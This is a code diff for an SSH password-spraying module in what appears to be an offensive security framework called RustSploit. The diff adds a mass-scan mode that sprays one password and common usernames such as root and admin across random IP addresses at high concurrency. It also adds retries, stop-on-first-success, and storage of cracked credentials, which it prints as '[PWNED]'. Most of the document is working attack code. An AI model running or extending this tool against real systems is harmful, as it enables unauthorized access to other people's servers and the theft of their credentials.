@@ -12,14 +12,12 @@ use std::{
     collections::HashSet,
     fs::File,
     io::{BufRead, BufReader, Write},
-    net::TcpStream,
     sync::{
         atomic::{AtomicBool, AtomicU64, Ordering},
         Arc,
     },
     time::{Duration, Instant},
 };
-use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
 use anyhow::Context;
 use tokio::{
     sync::Semaphore,
@@ -28,22 +26,36 @@ use tokio::{
 };
 use ipnetwork::IpNetwork;
 
+use crate::utils::{cfg_prompt_yes_no, cfg_prompt_default, cfg_prompt_required};
+use crate::modules::creds::utils::{is_mass_scan_target, run_mass_scan, MassScanConfig};
+
+pub fn info() -> crate::module_info::ModuleInfo {
+    crate::module_info::ModuleInfo {
+        name: "SSH Password Spray".to_string(),
+        description: "Sprays a single password across multiple SSH targets and usernames. Avoids account lockouts by distributing attempts across hosts with configurable concurrency and delays.".to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: crate::module_info::ModuleRank::Normal,
+    }
+}
+
 const DEFAULT_SSH_PORT: u16 = 22;
 const DEFAULT_TIMEOUT_SECS: u64 = 10;
 const DEFAULT_THREADS: usize = 20;
 const PROGRESS_INTERVAL_SECS: u64 = 2;
 
 fn display_banner() {
-    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
-    println!("{}", "║   SSH Password Spray                                              ║".cyan());
-    println!("{}", "║   Spray single password across multiple targets/users             ║".cyan());
-    println!("{}", "║                                                                   ║".cyan());
-    println!("{}", "║   Benefits:                                                       ║".cyan());
-    println!("{}", "║   - Avoids account lockouts                                       ║".cyan());
-    println!("{}", "║   - Tests common passwords across many hosts                      ║".cyan());
-    println!("{}", "║   - Efficient for large network assessments                       ║".cyan());
-    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
-    println!();
+    crate::mprintln!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
+    crate::mprintln!("{}", "║   SSH Password Spray                                              ║".cyan());
+    crate::mprintln!("{}", "║   Spray single password across multiple targets/users             ║".cyan());
+    crate::mprintln!("{}", "║                                                                   ║".cyan());
+    crate::mprintln!("{}", "║   Benefits:                                                       ║".cyan());
+    crate::mprintln!("{}", "║   - Avoids account lockouts                                       ║".cyan());
+    crate::mprintln!("{}", "║   - Tests common passwords across many hosts                      ║".cyan());
+    crate::mprintln!("{}", "║   - Efficient for large network assessments                       ║".cyan());
+    crate::mprintln!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
+    crate::mprintln!();
 }
 
 /// Normalize target for connection
@@ -97,7 +109,7 @@ impl Statistics {
         let elapsed = self.start_time.elapsed().as_secs_f64();
         let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
         
-        print!(
+        crate::mprint!(
             "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
             "[Progress]".cyan(),
             total.to_string().bold(),
@@ -110,13 +122,13 @@ impl Statistics {
     }
     
     fn print_summary(&self) {
-        println!();
-        println!("{}", "=== Spray Summary ===".cyan().bold());
-        println!("Total attempts: {}", self.total_attempts.load(Ordering::Relaxed));
-        println!("Successful: {}", self.successful.load(Ordering::Relaxed).to_string().green());
-        println!("Failed: {}", self.failed.load(Ordering::Relaxed));
-        println!("Errors: {}", self.errors.load(Ordering::Relaxed));
-        println!("Elapsed: {:.2}s", self.start_time.elapsed().as_secs_f64());
+        crate::mprintln!();
+        crate::mprintln!("{}", "=== Spray Summary ===".cyan().bold());
+        crate::mprintln!("Total attempts: {}", self.total_attempts.load(Ordering::Relaxed));
+        crate::mprintln!("Successful: {}", self.successful.load(Ordering::Relaxed).to_string().green());
+        crate::mprintln!("Failed: {}", self.failed.load(Ordering::Relaxed));
+        crate::mprintln!("Errors: {}", self.errors.load(Ordering::Relaxed));
+        crate::mprintln!("Elapsed: {:.2}s", self.start_time.elapsed().as_secs_f64());
     }
 }
 
@@ -133,7 +145,7 @@ pub struct SprayResult {
 fn try_ssh_auth(host: &str, port: u16, username: &str, password: &str, timeout_secs: u64) -> Result<bool> {
     let addr = format!("{}:{}", host, port);
     
-    let tcp = TcpStream::connect_timeout(
+    let tcp = crate::utils::blocking_tcp_connect(
         &addr.parse()?,
         Duration::from_secs(timeout_secs),
     )?;
@@ -214,15 +226,20 @@ pub async fn password_spray(
     password: &str,
     threads: usize,
     timeout_secs: u64,
+    stop_on_success: bool,
 ) -> Vec<SprayResult> {
     let total = targets.len() * usernames.len();
-    println!("{}", format!("[*] Spraying '{}' against {} targets, {} users ({} total attempts)", 
+    crate::mprintln!("{}", format!("[*] Spraying '{}' against {} targets, {} users ({} total attempts)",
         password, targets.len(), usernames.len(), total).cyan());
-    
+    if stop_on_success {
+        crate::mprintln!("{}", "[*] Stop-on-success enabled: will halt after first valid credential".yellow());
+    }
+
     let results = Arc::new(tokio::sync::Mutex::new(Vec::new()));
     let stats = Arc::new(Statistics::new());
     let semaphore = Arc::new(Semaphore::new(threads));
     let stop = Arc::new(AtomicBool::new(false));
+    let success_stop = Arc::new(AtomicBool::new(false));
     
     // Progress reporter
     let stats_clone = Arc::clone(&stats);
@@ -238,48 +255,91 @@ pub async fn password_spray(
     let mut handles = Vec::new();
     
     for (host, port) in targets {
+        if success_stop.load(Ordering::Relaxed) {
+            break;
+        }
         for user in usernames {
+            if success_stop.load(Ordering::Relaxed) {
+                break;
+            }
             let semaphore = Arc::clone(&semaphore);
             let results = Arc::clone(&results);
             let stats = Arc::clone(&stats);
+            let success_stop_clone = Arc::clone(&success_stop);
             let host = host.clone();
             let user = user.clone();
             let password = password.to_string();
-            
+
             let handle: tokio::task::JoinHandle<Result<()>> = tokio::spawn(async move {
+                // Check if we should stop before acquiring permit
+                if success_stop_clone.load(Ordering::Relaxed) {
+                    return Ok(());
+                }
+
                 let _permit = semaphore.acquire().await.context("Semaphore acquisition failed")?;
-                
-                let host_clone = host.clone();
-                let user_clone = user.clone();
-                let pass_clone = password.clone();
-                
-                let result = spawn_blocking(move || {
-                    try_ssh_auth(&host_clone, port, &user_clone, &pass_clone, timeout_secs)
-                }).await;
-                
-                match result {
-                    Ok(Ok(true)) => {
-                        stats.record_attempt(true, false);
-                        let cred = SprayResult {
-                            host: host.clone(),
-                            port,
-                            username: user.clone(),
-                            password: password.clone(),
-                        };
-                        println!("\r{}", format!("[PWNED] {}:{} @ {}:{}", user, password, host, port).red().bold());
-                        let _ = std::io::Write::flush(&mut std::io::stdout());
-                        results.lock().await.push(cred);
-                    }
-                    Ok(Ok(false)) => {
-                        stats.record_attempt(false, false);
-                    }
-                    _ => {
-                        stats.record_attempt(false, true);
+
+                // Check again after acquiring permit
+                if success_stop_clone.load(Ordering::Relaxed) {
+                    return Ok(());
+                }
+
+                const MAX_RETRIES: u32 = 2;
+                let mut attempt = 0u32;
+
+                loop {
+                    let host_clone = host.clone();
+                    let user_clone = user.clone();
+                    let pass_clone = password.clone();
+
+                    let result = spawn_blocking(move || {
+                        try_ssh_auth(&host_clone, port, &user_clone, &pass_clone, timeout_secs)
+                    }).await;
+
+                    match result {
+                        Ok(Ok(true)) => {
+                            stats.record_attempt(true, false);
+                            let cred = SprayResult {
+                                host: host.clone(),
+                                port,
+                                username: user.clone(),
+                                password: password.clone(),
+                            };
+                            crate::mprintln!("\r{}", format!("[PWNED] {}:{} @ {}:{}", user, password, host, port).red().bold());
+                            let _ = std::io::Write::flush(&mut std::io::stdout());
+                            results.lock().await.push(cred);
+                            // Persist credential to framework credential store
+                            let _ = crate::cred_store::store_credential(
+                                &host, port, "ssh", &user, &password,
+                                crate::cred_store::CredType::Password,
+                                "creds/generic/ssh_spray",
+                            ).await;
+                            // Signal stop if stop_on_success is enabled
+                            if stop_on_success {
+                                success_stop_clone.store(true, Ordering::Relaxed);
+                            }
+                            break;
+                        }
+                        Ok(Ok(false)) => {
+                            stats.record_attempt(false, false);
+                            break;
+                        }
+                        Ok(Err(_)) | Err(_) => {
+                            // Connection error — retry with exponential backoff
+                            if attempt < MAX_RETRIES {
+                                attempt += 1;
+                                // Exponential backoff: 500ms, 1000ms
+                                let delay_ms = 500u64 * (1u64 << (attempt - 1));
+                                sleep(Duration::from_millis(delay_ms)).await;
+                                continue;
+                            }
+                            stats.record_attempt(false, true);
+                            break;
+                        }
                     }
                 }
                 Ok(())
             });
-            
+
             handles.push(handle);
         }
     }
@@ -302,7 +362,11 @@ pub async fn password_spray(
 
 /// Save results to file
 fn save_results(results: &[SprayResult], path: &str) -> Result<()> {
-    let mut file = File::create(path)?;
+    use std::os::unix::fs::OpenOptionsExt;
+    let mut opts = std::fs::OpenOptions::new();
+    opts.write(true).create(true).truncate(true);
+    opts.mode(0o600);
+    let mut file = opts.open(path)?;
     
     writeln!(file, "# SSH Password Spray Results")?;
     writeln!(file, "# Generated by RustSploit")?;
@@ -313,78 +377,8 @@ fn save_results(results: &[SprayResult], path: &str) -> Result<()> {
         writeln!(file, "{}:{} @ {}:{}", result.username, result.password, result.host, result.port)?;
     }
     
-    println!("{}", format!("[+] Results saved to: {}", path).green());
+    crate::mprintln!("{}", format!("[+] Results saved to: {}", path).green());
     Ok(())
-}
-
-/// Prompt helper (sanitized)
-async fn prompt(message: &str) -> Result<String> {
-    print!("{}: ", message);
-    tokio::io::stdout()
-        .flush()
-        .await
-        .context("Failed to flush stdout")?;
-    let mut input = String::new();
-    tokio::io::BufReader::new(tokio::io::stdin())
-        .read_line(&mut input)
-        .await
-        .context("Failed to read input")?;
-    let trimmed = input.trim().to_string();
-    if trimmed.len() > 4096 {
-        return Err(anyhow!("Input too long (max 4096 chars)"));
-    }
-    if trimmed.contains('\0') {
-        return Err(anyhow!("Input contains null bytes"));
-    }
-    // Strip control characters except tab
-    Ok(trimmed.chars().filter(|c| !c.is_control() || *c == '\t').collect())
-}
-
-async fn prompt_default(message: &str, default: &str) -> Result<String> {
-    print!("{} [{}]: ", message, default);
-    tokio::io::stdout()
-        .flush()
-        .await
-        .context("Failed to flush stdout")?;
-    let mut input = String::new();
-    tokio::io::BufReader::new(tokio::io::stdin())
-        .read_line(&mut input)
-        .await
-        .context("Failed to read input")?;
-    let trimmed = input.trim();
-    if trimmed.len() > 4096 {
-        return Err(anyhow!("Input too long (max 4096 chars)"));
-    }
-    if trimmed.contains('\0') {
-        return Err(anyhow!("Input contains null bytes"));
-    }
-    if trimmed.is_empty() {
-        Ok(default.to_string())
-    } else {
-        // Strip control characters
-        Ok(trimmed.chars().filter(|c| !c.is_control() || *c == '\t').collect())
-    }
-}
-
-async fn prompt_yes_no(message: &str, default: bool) -> Result<bool> {
-    let hint = if default { "Y/n" } else { "y/N" };
-    print!("{} [{}]: ", message, hint);
-    tokio::io::stdout()
-        .flush()
-        .await
-        .context("Failed to flush stdout")?;
-    let mut input = String::new();
-    tokio::io::BufReader::new(tokio::io::stdin())
-        .read_line(&mut input)
-        .await
-        .context("Failed to read input")?;
-    let trimmed = input.trim().to_lowercase();
-    match trimmed.as_str() {
-        "" => Ok(default),
-        "y" | "yes" => Ok(true),
-        "n" | "no" => Ok(false),
-        _ => Ok(default),
-    }
 }
 
 /// Default usernames to spray
@@ -396,15 +390,61 @@ const DEFAULT_USERNAMES: &[&str] = &[
 /// Main entry point
 pub async fn run(target: &str) -> Result<()> {
     display_banner();
-    
+
+    // Mass scan mode: random IPs or target file
+    if is_mass_scan_target(target) {
+        let password = cfg_prompt_required("password", "Password to spray").await?;
+        if password.is_empty() {
+            return Err(anyhow!("Password is required"));
+        }
+        let users_str = cfg_prompt_default("usernames", "Usernames (comma-separated)", "root,admin,ubuntu").await?;
+        let users: Vec<String> = users_str.split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
+        let users = Arc::new(users);
+        let password = Arc::new(password);
+
+        return run_mass_scan(target, MassScanConfig {
+            protocol_name: "SSH Spray",
+            default_port: 22,
+            state_file: "ssh_spray_mass_state.log",
+            default_output: "ssh_spray_mass_results.txt",
+            default_concurrency: 200,
+        }, move |ip: std::net::IpAddr, port: u16| {
+            let users = users.clone();
+            let password = password.clone();
+            async move {
+                if !crate::utils::tcp_port_open(ip, port, std::time::Duration::from_secs(5)).await {
+                    return None;
+                }
+                let addr: std::net::SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
+                for user in users.iter() {
+                    let tcp = crate::utils::blocking_tcp_connect(
+                        &addr,
+                        std::time::Duration::from_secs(10),
+                    ).ok()?;
+                    let _ = tcp.set_read_timeout(Some(std::time::Duration::from_secs(10)));
+                    let _ = tcp.set_write_timeout(Some(std::time::Duration::from_secs(10)));
+                    let mut sess = ssh2::Session::new().ok()?;
+                    sess.set_tcp_stream(tcp);
+                    if sess.handshake().is_err() { continue; }
+                    if sess.userauth_password(user, &password).is_ok() && sess.authenticated() {
+                        let msg = format!("{}:{}:{}:{}", ip, port, user, password);
+                        crate::mprintln!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
+                        return Some(format!("{}\n", msg));
+                    }
+                }
+                None
+            }
+        }).await;
+    }
+
     // Get password to spray
-    let password = prompt("Password to spray").await?;
+    let password = cfg_prompt_required("password", "Password to spray").await?;
     if password.is_empty() {
         return Err(anyhow!("Password is required"));
     }
     
     // Get port
-    let port: u16 = prompt_default("SSH Port", "22").await?.parse().unwrap_or(DEFAULT_SSH_PORT);
+    let port: u16 = cfg_prompt_default("ssh_port", "SSH Port", "22").await?.parse().unwrap_or(DEFAULT_SSH_PORT);
     
     // Get targets
     let mut targets = Vec::new();
@@ -412,29 +452,29 @@ pub async fn run(target: &str) -> Result<()> {
     // Add initial target
     let host = normalize_target(target);
     if !host.is_empty() {
-        println!("{}", format!("[*] Initial target: {}", host).cyan());
+        crate::mprintln!("{}", format!("[*] Initial target: {}", host).cyan());
         targets.extend(parse_targets(&host, port));
     }
     
     // Get additional targets
-    let more_targets = prompt("Additional targets (comma-separated, CIDR, or leave empty)").await?;
+    let more_targets = cfg_prompt_default("additional_targets", "Additional targets (comma-separated, CIDR, or leave empty)", "").await?;
     if !more_targets.is_empty() {
         targets.extend(parse_targets(&more_targets, port));
     }
     
     // Load from file?
-    if prompt_yes_no("Load targets from file?", false).await? {
-        let file_path = prompt("File path").await?;
+    if cfg_prompt_yes_no("load_targets_file", "Load targets from file?", false).await? {
+        let file_path = cfg_prompt_required("targets_file", "File path").await?;
         if !file_path.is_empty() {
             match load_list_from_file(&file_path) {
                 Ok(file_targets) => {
-                    println!("{}", format!("[*] Loaded {} targets from file", file_targets.len()).cyan());
+                    crate::mprintln!("{}", format!("[*] Loaded {} targets from file", file_targets.len()).cyan());
                     for t in file_targets {
                         targets.extend(parse_targets(&t, port));
                     }
                 }
                 Err(e) => {
-                    println!("{}", format!("[-] Failed to load file: {}", e).red());
+                    crate::mprintln!("{}", format!("[-] Failed to load file: {}", e).red());
                 }
             }
         }
@@ -448,28 +488,28 @@ pub async fn run(target: &str) -> Result<()> {
         return Err(anyhow!("No targets specified"));
     }
     
-    println!("{}", format!("[*] Total unique targets: {}", targets.len()).cyan());
+    crate::mprintln!("{}", format!("[*] Total unique targets: {}", targets.len()).cyan());
     
     // Get usernames
     let mut usernames: Vec<String> = Vec::new();
     
-    if prompt_yes_no("Load usernames from file?", false).await? {
-        let file_path = prompt("Username file path").await?;
+    if cfg_prompt_yes_no("load_usernames_file", "Load usernames from file?", false).await? {
+        let file_path = cfg_prompt_required("username_file", "Username file path").await?;
         if !file_path.is_empty() {
             match load_list_from_file(&file_path) {
                 Ok(loaded) => {
-                    println!("{}", format!("[*] Loaded {} usernames from file", loaded.len()).cyan());
+                    crate::mprintln!("{}", format!("[*] Loaded {} usernames from file", loaded.len()).cyan());
                     usernames.extend(loaded);
                 }
                 Err(e) => {
-                    println!("{}", format!("[-] Failed to load file: {}", e).red());
+                    crate::mprintln!("{}", format!("[-] Failed to load file: {}", e).red());
                 }
             }
         }
     }
     
     // Add default usernames?
-    if usernames.is_empty() || prompt_yes_no("Also test default usernames?", true).await? {
+    if usernames.is_empty() || cfg_prompt_yes_no("use_default_usernames", "Also test default usernames?", true).await? {
         for user in DEFAULT_USERNAMES {
             if !usernames.contains(&user.to_string()) {
                 usernames.push(user.to_string());
@@ -482,35 +522,37 @@ pub async fn run(target: &str) -> Result<()> {
     }
     
     // Get scan options
-    let threads: usize = prompt_default("Concurrent threads", &DEFAULT_THREADS.to_string()).await?
+    let threads: usize = cfg_prompt_default("concurrency", "Concurrent threads", &DEFAULT_THREADS.to_string()).await?
         .parse()
         .unwrap_or(DEFAULT_THREADS);
-    let timeout: u64 = prompt_default("Connection timeout (seconds)", &DEFAULT_TIMEOUT_SECS.to_string()).await?
+    let timeout: u64 = cfg_prompt_default("timeout", "Connection timeout (seconds)", &DEFAULT_TIMEOUT_SECS.to_string()).await?
         .parse()
         .unwrap_or(DEFAULT_TIMEOUT_SECS);
-    
-    println!();
-    
+
+    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", false).await?;
+
+    crate::mprintln!();
+
     // Run spray
-    let results = password_spray(targets, &usernames, &password, threads, timeout).await;
+    let results = password_spray(targets, &usernames, &password, threads, timeout, stop_on_success).await;
     
     // Save results?
-    if !results.is_empty() && prompt_yes_no("Save results to file?", true).await? {
-        let raw = prompt_default("Output file", "ssh_spray_results.txt").await?;
+    if !results.is_empty() && cfg_prompt_yes_no("save_results", "Save results to file?", true).await? {
+        let raw = cfg_prompt_default("output_file", "Output file", "ssh_spray_results.txt").await?;
         // Force basename only — no directory traversal
         let output_path = std::path::Path::new(&raw)
             .file_name()
             .map(|n| n.to_string_lossy().to_string())
             .unwrap_or_else(|| "ssh_spray_results.txt".to_string());
         if output_path.is_empty() || output_path.starts_with('.') {
-            println!("{}", "[-] Invalid output filename".red());
+            crate::mprintln!("{}", "[-] Invalid output filename".red());
         } else if let Err(e) = save_results(&results, &output_path) {
-            println!("{}", format!("[-] Failed to save: {}", e).red());
+            crate::mprintln!("{}", format!("[-] Failed to save: {}", e).red());
         }
     }
     
-    println!();
-    println!("{}", format!("[*] Password spray complete. Found {} valid credentials.", results.len()).green());
+    crate::mprintln!();
+    crate::mprintln!("{}", format!("[*] Password spray complete. Found {} valid credentials.", results.len()).green());
     
     Ok(())
 }
